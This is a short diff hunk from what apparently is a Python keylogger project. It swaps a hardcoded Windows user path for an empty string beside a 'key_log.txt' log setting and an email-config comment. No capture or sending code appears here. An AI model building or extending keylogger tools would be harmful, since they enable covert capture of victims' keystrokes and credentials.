@@ -32,7 +32,7 @@ keys_information = 'key_log.txt'
 
 # Change file path on your own
 
-file_path = 'C:\\Users\\kubaj\\Desktop\\Python\\KeyLogger\\KeyLoggerD'
+file_path = ''
 extend = '\\'
 
 # Email config
